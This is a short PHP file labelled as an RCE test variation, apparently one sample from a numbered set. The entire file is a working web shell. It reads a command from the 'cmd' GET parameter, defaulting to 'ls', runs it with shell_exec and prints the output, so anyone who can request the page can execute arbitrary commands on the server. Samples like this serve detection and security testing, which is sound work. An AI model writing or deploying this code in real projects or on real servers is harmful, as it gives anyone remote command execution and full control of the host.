<?php
// RCE test variation #808
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>